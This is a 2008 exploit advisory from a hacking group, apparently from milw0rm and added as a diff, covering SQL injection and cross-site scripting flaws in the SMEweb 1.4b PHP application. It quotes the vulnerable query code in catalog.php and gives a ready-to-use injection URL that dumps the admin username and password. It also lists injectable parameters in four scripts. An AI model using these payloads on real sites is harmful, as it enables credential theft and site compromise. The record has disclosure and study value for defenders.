@@ -1,0 +1,65 @@
+=======================================================
+ SMEweb 1.4b (SQL/XSS) Multiple Remote Vulnerabilities
+=======================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+AUTHOR : CWH Underground
+DATE   : 2 June 2008
+SITE   : www.citec.us
+
+
+#####################################################
+ APPLICATION : SMEweb
+ VERSION     : 1.4b
+ VENDOR      : http://www.smethailand.com/ 
+ DOWNLOAD    : http://www.geocities.com/smes_thailand/smeweb_v14b.zip
+#####################################################
+
+---SQL Injection Exploit---
+
+##############################################
+Vulnerable: catalog.php (Line:66-69)
+
+if($idp)  
+ $sql = "select * from ".$fix."catalog where idp='$idp' and category NOT IN ('L1','LA') ";
+elseif($category)   	
+ $sql = "select * from ".$fix."catalog where category='$category' order by idp desc limit  1";  
+
+ $result = mysql_db_query($dbname,$sql);
+###############################################
+
+***It's Work with Magic_quote must turn off***
+
+http://[target]/[path]/catalog.php?idp=1'union select 1,2,password,username,5,6,7,8 from smeweb_user where userid=1 ORDER BY counter/*
+
+
+---Multiple Remote XSS Exploit---
+
+[+]catalog.php
+[+]search.php
+[+]bb.php
+[+]order.php
+
+Example:
+     
+http://[target]/[path]/catalog.php?data=<XSS>
+http://[target]/[path]/search.php?keyword=<XSS>
+http://[target]/[path]/bb.php?page=<XSS>
+http://[target]/[path]/order.php?new_s=<XSS>
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-02]
